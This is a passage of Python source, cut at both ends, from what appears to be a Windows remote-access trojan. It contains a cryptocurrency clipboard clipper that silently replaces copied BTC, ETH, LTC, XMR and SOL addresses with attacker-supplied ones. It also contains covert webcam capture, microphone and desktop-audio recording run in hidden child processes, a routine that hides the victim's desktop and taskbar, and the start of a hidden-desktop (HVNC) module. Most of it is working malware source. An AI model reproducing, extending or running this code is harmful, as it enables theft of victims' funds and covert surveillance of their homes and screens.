SWP_NOZORDER = 0x0004
SWP_SHOWWINDOW = 0x0040
RDW_INVALIDATE = 0x0001
RDW_ALLCHILDREN = 0x0080
RDW_UPDATENOW = 0x0100


def _desktop_windows():
    u = ctypes.windll.user32
    u.FindWindowW.restype = ctypes.c_void_p
    handles = []
    for cls in ("Progman", "Shell_TrayWnd"):
        h = u.FindWindowW(cls, None)
        if h:
            handles.append(h)
    return handles


def _shell_alive():
    """Progman belongs to explorer; if it is gone the shell needs a restart."""
    u = ctypes.windll.user32
    u.FindWindowW.restype = ctypes.c_void_p
    return bool(u.FindWindowW("Progman", None))


def _restart_shell():
    """Rebuild explorer so the wallpaper and taskbar come back."""
    try:
        subprocess.Popen(["taskkill", "/f", "/im", "explorer.exe"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=0x08000000)
        time.sleep(1.2)
    except OSError:
        pass
    try:
        subprocess.Popen(["explorer.exe"], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
        return True
    except OSError:
        return False


def _mask_hotkey_loop():
    """Ctrl+Alt+L lifts the mask from the host keyboard, no panel needed."""
    u = ctypes.windll.user32
    MOD_ALT, MOD_CONTROL, MOD_NOREPEAT = 0x0001, 0x0002, 0x4000
    try:
        if not u.RegisterHotKey(None, 0xB1, MOD_CONTROL | MOD_ALT | MOD_NOREPEAT,
                                MASK_HOTKEY_VK):
            return
    except Exception:
        return
    MASK["hotkey"] = True
    msg = ctypes.create_string_buffer(64)
    try:
        while MASK["on"]:
            # PeekMessageW with PM_REMOVE, drained so the thread stays light
            if u.PeekMessageW(msg, None, 0, 0, 1):
                if int.from_bytes(msg.raw[8:12], "little") == 0x0312:   # WM_HOTKEY
                    lift({})
                    break
            time.sleep(0.08)
    finally:
        try:
            u.UnregisterHotKey(None, 0xB1)
        except Exception:
            pass
        MASK["hotkey"] = False


def _mask_watchdog(ttl):
    """Auto-lift. A hidden desktop nobody can click out of is a hostage."""
    deadline = time.time() + ttl
    while MASK["on"] and time.time() < deadline:
        time.sleep(0.5)
    if MASK["on"]:
        try:
            lift({"reason": "expired"})
        except Exception:
            pass


def _mask_atexit():
    if MASK["on"]:
        try:
            lift({})
        except Exception:
            pass


atexit.register(_mask_atexit)


def mask(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    u = ctypes.windll.user32
    u.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
    try:
        ttl = int(args.get("ttl") or MASK_TTL)
    except (TypeError, ValueError):
        ttl = MASK_TTL
    ttl = max(30, min(3600, ttl))

    hs = _desktop_windows()
    for h in hs:
        u.ShowWindow(h, 0)                                  # SW_HIDE
    MASK.update(on=True, since=time.time(), ttl=ttl, handles=hs)

    t = threading.Thread(target=_mask_watchdog, args=(ttl,), daemon=True)
    t.start()
    MASK["watchdog"] = t
    threading.Thread(target=_mask_hotkey_loop, daemon=True).start()

    return {"masked": True, "handles": len(hs), "ttl": ttl,
            "hotkey": "ctrl+alt+l",
            "escape": "ctrl+alt+l on the host, or lift from the panel"}


def lift(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    u = ctypes.windll.user32
    u.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
    u.SetWindowPos.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int,
                               ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_uint]

    restarted = False
    hs = _desktop_windows() or list(MASK.get("handles") or [])
    for h in hs:
        u.ShowWindow(h, SW_SHOWNORMAL)
        u.SetWindowPos(h, None, 0, 0, 0, 0,
                       SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_SHOWWINDOW)

    # force the wallpaper to repaint; hiding Progman leaves it blank otherwise
    try:
        desk = u.GetDesktopWindow()
        u.RedrawWindow(desk, None, None,
                       RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW)
        u.InvalidateRect(None, None, True)
    except Exception:
        pass

    if not _shell_alive():
        restarted = _restart_shell()

    MASK.update(on=False, handles=[], ttl=0, since=0.0)
    return {"masked": False, "handles": len(hs),
            "shell_restarted": restarted,
            "reason": str(args.get("reason") or "manual")}


def mask_status(_args):
    left = 0
    if MASK["on"] and MASK["ttl"]:
        left = max(0, int(MASK["ttl"] - (time.time() - MASK["since"])))
    return {"masked": bool(MASK["on"]), "expires_in": left,
            "ttl": MASK["ttl"], "hotkey": "ctrl+alt+l",
            "hotkey_bound": bool(MASK["hotkey"]),
            "shell_alive": _shell_alive() if IS_WIN else True}


# --------------------------------------------------------------------------
# clipboard clipper
# --------------------------------------------------------------------------
CLIPPER = {"on": False, "thread": None, "hits": [], "last": "", "addrs": {}}

COIN_PATTERNS = {
    "btc": re.compile(r"(?<![A-Za-z0-9])(bc1[a-zA-HJ-NP-Z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})(?![A-Za-z0-9])"),
    "eth": re.compile(r"(?<![A-Za-z0-9])0x[a-fA-F0-9]{40}(?![A-Za-z0-9])"),
    "ltc": re.compile(r"(?<![A-Za-z0-9])(ltc1[a-z0-9]{25,62}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,33})(?![A-Za-z0-9])"),
    "xmr": re.compile(r"(?<![A-Za-z0-9])4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}(?![A-Za-z0-9])"),
    "sol": re.compile(r"(?<![A-Za-z0-9])[1-9A-HJ-NP-Za-km-z]{32,44}(?![A-Za-z0-9])"),
}


def _clipper_loop():
    while CLIPPER["on"]:
        try:
            text = clipboard_get({}).get("text", "")
        except Exception:
            text = ""
        if text and text != CLIPPER["last"]:
            CLIPPER["last"] = text
            for coin, rx in COIN_PATTERNS.items():
                target = CLIPPER["addrs"].get(coin)
                if not target:
                    continue
                m = rx.search(text)
                if not m:
                    continue
                found = m.group(0)
                if found == target:
                    continue
                new_text = text[:m.start()] + target + text[m.end():]
                try:
                    clipboard_set({"text": new_text})
                except Exception:
                    pass
                CLIPPER["last"] = new_text
                hit = {"coin": coin, "from": found, "to": target,
                       "context": text[:200], "ts": time.time()}
                CLIPPER["hits"].append(hit)
                if len(CLIPPER["hits"]) > 200:
                    del CLIPPER["hits"][:100]
                event("clipper", **hit)
                break
        time.sleep(0.7)


def clipper_start(args):
    addrs = {k: str(args.get(k, "")).strip() for k in COIN_PATTERNS if args.get(k)}
    addrs = {k: v for k, v in addrs.items() if v}
    if not addrs:
        raise RuntimeError("no addresses supplied")
    CLIPPER["addrs"].update(addrs)
    if not CLIPPER["on"]:
        CLIPPER["on"] = True
        t = threading.Thread(target=_clipper_loop, daemon=True)
        CLIPPER["thread"] = t
        t.start()
    return {"on": True, "coins": sorted(CLIPPER["addrs"])}


def clipper_stop(_args):
    CLIPPER["on"] = False
    return {"on": False}


def clipper_hits(_args):
    return {"hits": list(reversed(CLIPPER["hits"])), "on": CLIPPER["on"]}


# --------------------------------------------------------------------------
# webcam
# --------------------------------------------------------------------------
WEBCAM = {"index": 0, "stop": False}
CAM = {"proc": None, "lock": threading.Lock()}


def _child_argv(*mode):
    """Build an argv that re-enters this build in a helper mode."""
    if getattr(sys, "frozen", False):
        return [sys.executable, *mode]
    return [sys.executable, os.path.abspath(__file__), *mode]


def _child_flags():
    return getattr(subprocess, "CREATE_NO_WINDOW", 0)


def _cam_kill():
    p = CAM["proc"]
    CAM["proc"] = None
    if p is None:
        return
    try:
        if p.poll() is None:
            p.stdin.write('{"op":"stop"}\n')
            p.stdin.flush()
            p.wait(timeout=3)
    except (OSError, ValueError, subprocess.TimeoutExpired):
        try:
            p.kill()
        except OSError:
            pass


def _cam_call(payload, timeout=20):
    """Send one request to the camera worker and read one reply."""
    with CAM["lock"]:
        p = CAM["proc"]
        if p is None or p.poll() is not None:
            _cam_kill()
            p = subprocess.Popen(
                _child_argv("--camera-worker"),
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL, text=True, encoding="utf-8",
                bufsize=1, creationflags=_child_flags(),
            )
            CAM["proc"] = p
        try:
            p.stdin.write(json.dumps(payload) + "\n")
            p.stdin.flush()
        except (OSError, ValueError) as e:
            _cam_kill()
            raise RuntimeError(f"camera worker did not accept the request: {e}")
        box = {}

        def read():
            try:
                box["line"] = p.stdout.readline()
            except (OSError, ValueError) as e:
                box["error"] = str(e)

        t = threading.Thread(target=read, daemon=True)
        t.start()
        t.join(timeout)
        if t.is_alive():
            _cam_kill()
            raise RuntimeError("camera worker timed out")
        if box.get("error"):
            _cam_kill()
            raise RuntimeError(f"camera worker failed: {box['error']}")
        line = box.get("line") or ""
        if not line:
            code = p.poll()
            _cam_kill()
            raise RuntimeError(f"camera worker exited (code {code}) while capturing")
        try:
            reply = json.loads(line)
        except json.JSONDecodeError:
            _cam_kill()
            raise RuntimeError("camera worker returned malformed data")
        if not reply.get("ok"):
            raise RuntimeError(reply.get("error") or "camera failed")
        return reply.get("data") or {}


def webcam_list(_args):
    if not IS_WIN:
        return {"cameras": []}
    return _cam_call({"op": "list"}, timeout=40)


def webcam_frame(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    idx = int(args.get("index", WEBCAM["index"]))
    quality = max(20, min(95, int(args.get("quality", 70))))
    data = _cam_call({"op": "frame", "index": idx, "quality": quality}, timeout=20)
    WEBCAM["index"] = idx
    return data


def webcam_stop(_args):
    WEBCAM["stop"] = True
    with CAM["lock"]:
        _cam_kill()
    return {"stopped": True}


def camera_worker_main():
    """Child process: owns the DirectShow handles so a driver fault is contained."""
    try:
        import cv2
    except ImportError:
        print(json.dumps({"ok": False, "error": "opencv-python is not installed"}))
        sys.stdout.flush()
        sys.exit(0)

    caps = {}

    def cap_for(idx):
        cap = caps.get(idx)
        if cap is not None and cap.isOpened():
            return cap
        for backend in (cv2.CAP_DSHOW, cv2.CAP_ANY):
            c = cv2.VideoCapture(idx, backend)
            if c.isOpened():
                caps[idx] = c
                return c
            c.release()
        return None

    for raw in sys.stdin:
        try:
            req = json.loads(raw)
        except json.JSONDecodeError:
            continue
        op = req.get("op")
        try:
            if op == "stop":
                break
            if op == "list":
                found = []
                for i in range(6):
                    cap = cap_for(i)
                    if cap is None:
                        continue
                    okf, frame = cap.read()
                    if okf and frame is not None:
                        found.append({"index": i, "width": frame.shape[1],
                                      "height": frame.shape[0]})
                    else:
                        cap.release()
                        caps.pop(i, None)
                reply = {"ok": True, "data": {"cameras": found, "count": len(found)}}
            elif op == "frame":
                idx = int(req.get("index", 0))
                quality = max(20, min(95, int(req.get("quality", 70))))
                cap = cap_for(idx)
                if cap is None:
                    reply = {"ok": False, "error": f"camera {idx} did not open"}
                else:
                    okf, frame = False, None
                    for _ in range(3):
                        okf, frame = cap.read()
                        if okf and frame is not None:
                            break
                        time.sleep(0.05)
                    if not okf or frame is None:
                        reply = {"ok": False, "error": "camera returned no frame"}
                    else:
                        okj, buf = cv2.imencode(
                            ".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), quality])
                        reply = ({"ok": True, "data": {
                            "jpeg": _b64(buf.tobytes()),
                            "width": frame.shape[1], "height": frame.shape[0],
                            "index": idx}}
                            if okj else {"ok": False, "error": "jpeg encode failed"})
            else:
                reply = {"ok": False, "error": "unknown camera operation"}
        except Exception as e:  # noqa: BLE001 - the worker must never die silently
            reply = {"ok": False, "error": f"{type(e).__name__}: {e}"}
        sys.stdout.write(json.dumps(reply) + "\n")
        sys.stdout.flush()

    for cap in caps.values():
        try:
            cap.release()
        except Exception:  # noqa: BLE001
            pass


# --------------------------------------------------------------------------
# microphone + desktop audio
# --------------------------------------------------------------------------
def mic_list(_args):
    r = subprocess.run(_child_argv("--audio-list"), capture_output=True,
                       text=True, timeout=40, creationflags=_child_flags())
    line = (r.stdout or "").strip().splitlines()
    if not line:
        raise RuntimeError("audio enumeration failed: " +
                           ((r.stderr or "").strip()[-300:] or f"exit {r.returncode}"))
    try:
        msg = json.loads(line[-1])
    except json.JSONDecodeError:
        raise RuntimeError("audio enumeration returned malformed data")
    if not msg.get("ok"):
        raise RuntimeError(msg.get("error") or "audio enumeration failed")
    return msg.get("data") or {}


def _capture(kind, seconds):
    """Run WASAPI capture in a child: a COM fault must not end the session."""
    seconds = max(1, min(30, int(seconds)))
    try:
        r = subprocess.run(_child_argv("--capture-worker", kind, str(seconds)),
                           capture_output=True, text=True, timeout=seconds + 30,
                           creationflags=_child_flags())
    except subprocess.TimeoutExpired:
        raise RuntimeError("capture timed out")
    lines = (r.stdout or "").strip().splitlines()
    if not lines:
        detail = (r.stderr or "").strip()[-400:]
        raise RuntimeError(f"capture worker exited ({r.returncode})" +
                           (f": {detail}" if detail else ""))
    try:
        msg = json.loads(lines[-1])
    except json.JSONDecodeError:
        raise RuntimeError("capture worker returned malformed data")
    if not msg.get("ok"):
        raise RuntimeError(msg.get("error") or "capture failed")
    return msg.get("data") or {}


def mic_capture(args):
    return _capture("mic", args.get("seconds", 5))


def desktop_audio(args):
    return _capture("loopback", args.get("seconds", 5))


def _soundcard():
    try:
        import soundcard as sc
        import numpy as np
        return sc, np
    except ImportError:
        raise RuntimeError("soundcard/numpy is not installed on the host")


# --------------------------------------------------------------------------
# WASAPI capture (ctypes)
# soundcard's MediaFoundation backend fails on several drivers, so capture is
# implemented directly against WASAPI. Everything below runs inside the worker
# process, never in the session.
# --------------------------------------------------------------------------
class _GUID(ctypes.Structure):
    _fields_ = [("Data1", ctypes.c_uint32), ("Data2", ctypes.c_uint16),
                ("Data3", ctypes.c_uint16), ("Data4", ctypes.c_ubyte * 8)]


class _PROPERTYKEY(ctypes.Structure):
    _fields_ = [("fmtid", _GUID), ("pid", ctypes.c_uint32)]


class _PROPVARIANT(ctypes.Structure):
    _fields_ = [("vt", ctypes.c_ushort), ("r1", ctypes.c_ushort),
                ("r2", ctypes.c_ushort), ("r3", ctypes.c_ushort),
                ("data", ctypes.c_void_p), ("pad", ctypes.c_void_p)]


class _WAVEFORMATEX(ctypes.Structure):
    _fields_ = [("wFormatTag", ctypes.c_uint16), ("nChannels", ctypes.c_uint16),
                ("nSamplesPerSec", ctypes.c_uint32),
                ("nAvgBytesPerSec", ctypes.c_uint32),
                ("nBlockAlign", ctypes.c_uint16), ("wBitsPerSample", ctypes.c_uint16),
                ("cbSize", ctypes.c_uint16)]


class _WAVEFORMATEXTENSIBLE(ctypes.Structure):
    _fields_ = [("Format", _WAVEFORMATEX), ("wValidBitsPerSample", ctypes.c_uint16),
                ("dwChannelMask", ctypes.c_uint32), ("SubFormat", _GUID)]


def _uuid(value):
    import uuid as _u
    f = _u.UUID(value).fields
    return _GUID(f[0], f[1], f[2], (ctypes.c_ubyte * 8)(*_u.UUID(value).bytes[8:]))


CLSID_MMDEVICE_ENUM = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
IID_MMDEVICE_ENUM = "{A95664D2-9614-4F35-A746-DE8DB63617E6}"
IID_AUDIO_CLIENT = "{1CB9AD4C-DBFA-4C32-B178-C2F568A703B2}"
IID_CAPTURE_CLIENT = "{C8ADBD64-E71E-48A0-A4DE-185C395CD317}"
PKEY_DEVICE_FRIENDLY_NAME = "{A45C254E-DF1C-4EFD-8020-67D146A850E0}"

COINIT_APARTMENTTHREADED = 0x2
CLSCTX_ALL = 23
DEVICE_STATE_ACTIVE = 1
STGM_READ = 0
E_RENDER, E_CAPTURE, E_CONSOLE = 0, 1, 0
SHAREMODE_SHARED = 0
STREAMFLAGS_LOOPBACK = 0x00020000
BUFFERFLAGS_SILENT = 0x2
VT_LPWSTR = 31


def _com(ptr, index, restype, argtypes=()):
    """Call one COM slot. ptr is a c_void_p, index is the vtable offset."""
    vtbl = ctypes.cast(ptr, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p)))[0]
    proto = ctypes.WINFUNCTYPE(restype, ctypes.c_void_p, *argtypes)
    return proto(vtbl[index])


def _hr(ptr, index, argtypes=(), *args):
    return _com(ptr, index, ctypes.c_long, argtypes)(ptr, *args)


def _check(hr, what):
    if hr < 0:
        raise RuntimeError(f"{what} failed (HRESULT 0x{hr & 0xFFFFFFFF:08X})")
    return hr


class _Wasapi:
    """Owns the COM objects for one capture session."""

    def __init__(self, kind):
        self.enum = ctypes.c_void_p()
        self.dev = ctypes.c_void_p()
        self.client = ctypes.c_void_p()
        self.cap = ctypes.c_void_p()
        self.fmt = None
        self.started = False
        self.kind = kind
        ctypes.windll.ole32.CoInitializeEx(None, COINIT_APARTMENTTHREADED)
        ole32 = ctypes.windll.ole32
        ole32.CoCreateInstance.argtypes = [
            ctypes.POINTER(_GUID), ctypes.c_void_p, ctypes.c_uint32,
            ctypes.POINTER(_GUID), ctypes.POINTER(ctypes.c_void_p)]
        ole32.CoCreateInstance.restype = ctypes.c_long
        _check(ole32.CoCreateInstance(
            ctypes.byref(_uuid(CLSID_MMDEVICE_ENUM)), None, CLSCTX_ALL,
            ctypes.byref(_uuid(IID_MMDEVICE_ENUM)),
            ctypes.byref(self.enum)), "CoCreateInstance(MMDeviceEnumerator)")

        flow = E_CAPTURE if kind == "mic" else E_RENDER
        _check(_hr(self.enum, 4, [ctypes.c_int, ctypes.c_int,
                                  ctypes.POINTER(ctypes.c_void_p)],
                   flow, E_CONSOLE, ctypes.byref(self.dev)),
               "GetDefaultAudioEndpoint")
        _check(_hr(self.dev, 3, [ctypes.POINTER(_GUID), ctypes.c_uint32,
                                 ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)],
                   ctypes.byref(_uuid(IID_AUDIO_CLIENT)), CLSCTX_ALL, None,
                   ctypes.byref(self.client)), "IMMDevice::Activate")
        fmt_ptr = ctypes.c_void_p()
        _check(_hr(self.client, 8, [ctypes.POINTER(ctypes.c_void_p)],
                   ctypes.byref(fmt_ptr)), "GetMixFormat")
        self.wfx = ctypes.cast(fmt_ptr, ctypes.POINTER(_WAVEFORMATEX)).contents
        flags = STREAMFLAGS_LOOPBACK if kind == "loopback" else 0
        _check(_hr(self.client, 3,
                   [ctypes.c_int, ctypes.c_uint32, ctypes.c_int64, ctypes.c_int64,
                    ctypes.POINTER(_WAVEFORMATEX), ctypes.POINTER(_GUID)],
                   SHAREMODE_SHARED, flags, 10_000_000, 0,
                   ctypes.byref(self.wfx), None), "IAudioClient::Initialize")
        _check(_hr(self.client, 14, [ctypes.POINTER(_GUID),
                                     ctypes.POINTER(ctypes.c_void_p)],
                   ctypes.byref(_uuid(IID_CAPTURE_CLIENT)),
                   ctypes.byref(self.cap)), "GetService(IAudioCaptureClient)")

    def start(self):
        _check(_hr(self.client, 10, []), "IAudioClient::Start")
        self.started = True

    def read(self, frames):
        """Collect exactly `frames` frames of interleaved PCM bytes."""
        block = max(1, int(self.wfx.nBlockAlign))
        chunks = []
        got = 0
        idle = 0
        while got < frames:
            avail = ctypes.c_uint32()
            _check(_hr(self.cap, 5, [ctypes.POINTER(ctypes.c_uint32)],
                       ctypes.byref(avail)), "GetNextPacketSize")
            if not avail.value:
                idle += 1
                if idle > 4000:                      # ~40 s without audio
                    raise RuntimeError("no audio data arrived")
                time.sleep(0.01)
                continue
            idle = 0
            data = ctypes.c_void_p()
            nframes = ctypes.c_uint32()
            flags = ctypes.c_uint32()
            devpos = ctypes.c_uint64()
            qpc = ctypes.c_uint64()
            _check(_hr(self.cap, 3,
                       [ctypes.POINTER(ctypes.c_void_p),
                        ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32),
                        ctypes.POINTER(ctypes.c_uint64), ctypes.POINTER(ctypes.c_uint64)],
                       ctypes.byref(data), ctypes.byref(nframes),
                       ctypes.byref(flags), ctypes.byref(devpos),
                       ctypes.byref(qpc)), "GetBuffer")
            take = min(int(nframes.value), frames - got)
            if flags.value & BUFFERFLAGS_SILENT or not data.value:
                chunks.append(b"\x00" * (take * block))
            else:
                chunks.append(ctypes.string_at(data.value, take * block))
            _check(_hr(self.cap, 4, [ctypes.c_uint32], int(nframes.value)),
                   "ReleaseBuffer")
            got += take
        return b"".join(chunks)

    def close(self):
        try:
            if self.started:
                _hr(self.client, 11, [])
        except Exception:  # noqa: BLE001
            pass
        for ptr in (self.cap, self.client, self.dev, self.enum):
            if ptr and ptr.value:
                try:
                    _hr(ptr, 2, [])
                except Exception:  # noqa: BLE001
                    pass
        try:
            ctypes.windll.ole32.CoUninitialize()
        except Exception:  # noqa: BLE001
            pass


def _pcm_to_wav(raw, wfx):
    """Interleaved device PCM -> 16-bit mono WAV bytes."""
    import numpy as np
    channels = max(1, int(wfx.nChannels))
    rate = int(wfx.nSamplesPerSec)
    bits = int(wfx.wBitsPerSample)
    tag = int(wfx.wFormatTag)
    is_float = tag == 3
    if tag == 0xFFFE:
        ext = ctypes.cast(ctypes.pointer(wfx),
                          ctypes.POINTER(_WAVEFORMATEXTENSIBLE)).contents
        sub = ext.SubFormat
        is_float = (sub.Data1 == 3 and sub.Data2 == 0 and sub.Data3 == 0x0010)
    if is_float and bits == 32:
        arr = np.frombuffer(raw, dtype="<f4").astype("float32")
    elif bits == 16:
        arr = np.frombuffer(raw, dtype="<i2").astype("float32") / 32768.0
    elif bits == 24:
        b = np.frombuffer(raw, dtype="<u1").reshape(-1, 3)
        i = (b[:, 0].astype("int32") | (b[:, 1].astype("int32") << 8) |
             (b[:, 2].astype("int32") << 16))
        i = np.where(i & 0x800000, i - 0x1000000, i)
        arr = (i.astype("float32") / 8388608.0)
    elif bits == 32:
        arr = np.frombuffer(raw, dtype="<i4").astype("float32") / 2147483648.0
    else:
        raise RuntimeError(f"unsupported sample format: tag={tag} bits={bits}")
    if channels > 1:
        arr = arr.reshape(-1, channels).mean(axis=1)
    pcm = (np.clip(arr, -1.0, 1.0) * 32767).astype("<i2").tobytes()
    return _wav(pcm, rate), rate


def _wasapi_capture(kind, seconds):
    session = _Wasapi(kind)
    try:
        rate = int(session.wfx.nSamplesPerSec)
        frames = rate * max(1, min(30, int(seconds)))
        session.start()
        raw = session.read(frames)
        return _pcm_to_wav(raw, session.wfx)
    finally:
        session.close()


def _endpoint_name(dev):
    store = ctypes.c_void_p()
    _check(_hr(dev, 4, [ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)],
               STGM_READ, ctypes.byref(store)), "OpenPropertyStore")
    try:
        key = _PROPERTYKEY(_uuid(PKEY_DEVICE_FRIENDLY_NAME), 14)
        var = _PROPVARIANT()
        _check(_hr(store, 5, [ctypes.POINTER(_PROPERTYKEY), ctypes.POINTER(_PROPVARIANT)],
                   ctypes.byref(key), ctypes.byref(var)), "GetValue")
        if var.vt == VT_LPWSTR and var.data:
            return ctypes.wstring_at(var.data)
        return ""
    finally:
        _hr(store, 2, [])


def _audio_endpoints():
    """Return (microphones, loopback speaker name) using WASAPI directly."""
    session = _Wasapi.__new__(_Wasapi)
    session.enum = ctypes.c_void_p()
    ctypes.windll.ole32.CoInitializeEx(None, COINIT_APARTMENTTHREADED)
    ole32 = ctypes.windll.ole32
    ole32.CoCreateInstance.argtypes = [
        ctypes.POINTER(_GUID), ctypes.c_void_p, ctypes.c_uint32,
        ctypes.POINTER(_GUID), ctypes.POINTER(ctypes.c_void_p)]
    ole32.CoCreateInstance.restype = ctypes.c_long
    _check(ole32.CoCreateInstance(
        ctypes.byref(_uuid(CLSID_MMDEVICE_ENUM)), None, CLSCTX_ALL,
        ctypes.byref(_uuid(IID_MMDEVICE_ENUM)),
        ctypes.byref(session.enum)), "CoCreateInstance(MMDeviceEnumerator)")
    rows = []
    try:
        coll = ctypes.c_void_p()
        _check(_hr(session.enum, 3, [ctypes.c_int, ctypes.c_uint32,
                                     ctypes.POINTER(ctypes.c_void_p)],
                   E_CAPTURE, DEVICE_STATE_ACTIVE, ctypes.byref(coll)),
               "EnumAudioEndpoints")
        try:
            count = ctypes.c_uint32()
            _check(_hr(coll, 3, [ctypes.POINTER(ctypes.c_uint32)],
                       ctypes.byref(count)), "GetCount")
            default = ctypes.c_void_p()
            _check(_hr(session.enum, 4, [ctypes.c_int, ctypes.c_int,
                                         ctypes.POINTER(ctypes.c_void_p)],
                       E_CAPTURE, E_CONSOLE, ctypes.byref(default)),
                   "GetDefaultAudioEndpoint")
            default_name = _endpoint_name(default) if default.value else ""
            if default and default.value:
                _hr(default, 2, [])
            for i in range(count.value):
                dev = ctypes.c_void_p()
                _check(_hr(coll, 4, [ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)],
                           i, ctypes.byref(dev)), "IMMDeviceCollection::Item")
                try:
                    name = _endpoint_name(dev)
                    ident = ctypes.c_wchar_p()
                    _check(_hr(dev, 5, [ctypes.POINTER(ctypes.c_wchar_p)],
                               ctypes.byref(ident)), "IMMDevice::GetId")
                    rows.append({"id": ident.value or "", "name": name,
                                 "default": bool(name) and name == default_name})
                finally:
                    _hr(dev, 2, [])
        finally:
            _hr(coll, 2, [])
    finally:
        if session.enum and session.enum.value:
            _hr(session.enum, 2, [])
        ctypes.windll.ole32.CoUninitialize()

    speaker_name = ""
    try:
        spk = _Wasapi("loopback")
        speaker_name = _endpoint_name(spk.dev)
        spk.close()
    except Exception:  # noqa: BLE001
        speaker_name = ""
    return rows, speaker_name


def audio_list_main():
    try:
        mics, loopback = _audio_endpoints()
        out = {"ok": True, "data": {"microphones": mics, "count": len(mics),
                                    "loopback": loopback}}
    except Exception as e:  # noqa: BLE001
        out = {"ok": False, "error": f"{type(e).__name__}: {e}"}
    print(json.dumps(out))
    sys.stdout.flush()


def capture_worker_main(kind, seconds):
    kind = "mic" if kind == "mic" else "loopback"
    try:
        wav, rate = _wasapi_capture(kind, seconds)
        out = {"ok": True, "data": {"wav": _b64(wav), "seconds": int(seconds),
                                    "rate": rate, "bytes": len(wav)}}
    except Exception as e:  # noqa: BLE001
        out = {"ok": False, "error": f"{type(e).__name__}: {e}"}
    print(json.dumps(out))
    sys.stdout.flush()


def play_audio(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    raw = base64.b64decode(args.get("wav", ""))
    if not raw:
        raise RuntimeError("empty audio payload")
    path = _temp("play-" + uuid.uuid4().hex + ".wav")
    path.write_bytes(raw)
    import winsound
    winsound.PlaySound(str(path), winsound.SND_FILENAME | winsound.SND_ASYNC)
    return {"playing": True, "bytes": len(raw)}


def stop_audio(_args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    import winsound
    winsound.PlaySound(None, 0)
    return {"stopped": True}


# --------------------------------------------------------------------------
# HVNC — a second, invisible desktop
# --------------------------------------------------------------------------
HVNC = {
    "hdesk": None, "name": None, "last_hwnd": None, "last_error": None,
    "worker": None, "stop": None, "mode": None,
    "frame": None, "seq": 0, "ts": 0.0, "size": (0, 0),
    "quality": 60, "fps": 30, "scale": 1.0, "lock": threading.Lock(),
}

HVNC_NAME = "chonga-hvnc"
DESKTOP_ALL = 0x000F01FF
SRCCOPY = 0x00CC0020


class _STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_uint32), ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p), ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_uint32), ("dwY", ctypes.c_uint32),
        ("dwXSize", ctypes.c_uint32), ("dwYSize", ctypes.c_uint32),
        ("dwXCountChars", ctypes.c_uint32), ("dwYCountChars", ctypes.c_uint32),
        ("dwFillAttribute", ctypes.c_uint32), ("dwFlags", ctypes.c_uint32),
        ("wShowWindow", ctypes.c_uint16), ("cbReserved2", ctypes.c_uint16),
        ("lpReserved2", ctypes.c_void_p), ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p), ("hStdError", ctypes.c_void_p),
    ]


class _PROCESSINFO(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p), ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_uint32), ("dwThreadId", ctypes.c_uint32),
    ]


class _BMIH(ctypes.Structure):
    _fields_ = [
        ("biSize", ctypes.c_uint32), ("biWidth", ctypes.c_int32),
        ("biHeight", ctypes.c_int32), ("biPlanes", ctypes.c_uint16),
        ("biBitCount", ctypes.c_uint16), ("biCompression", ctypes.c_uint32),
        ("biSizeImage", ctypes.c_uint32), ("biXPelsPerMeter", ctypes.c_int32),
        ("biYPelsPerMeter", ctypes.c_int32), ("biClrUsed", ctypes.c_uint32),
        ("biClrImportant", ctypes.c_uint32),
    ]


class _RGBQUAD(ctypes.Structure):
    _fields_ = [("rgbBlue", ctypes.c_ubyte), ("rgbGreen", ctypes.c_ubyte),
                ("rgbRed", ctypes.c_ubyte), ("rgbReserved", ctypes.c_ubyte)]


class _BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", _BMIH), ("bmiColors", _RGBQUAD * 1)]


class _RECT(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]


def _desk_enum(hdesk):
    """Enumerate top-level windows on a desktop, in z-order."""
    _gdi_prototypes()
    u = ctypes.windll.user32
    u.IsWindowVisible.argtypes = [ctypes.c_void_p]
    u.IsWindowVisible.restype = ctypes.c_bool
    u.GetWindowTextLengthW.argtypes = [ctypes.c_void_p]
    u.GetWindowTextLengthW.restype = ctypes.c_int
    u.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.GetWindowTextW.restype = ctypes.c_int
    u.GetWindowRect.argtypes = [ctypes.c_void_p, ctypes.POINTER(_RECT)]
    u.GetWindowRect.restype = ctypes.c_bool
    u.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)]
    u.GetWindowThreadProcessId.restype = ctypes.c_uint32
    found = []

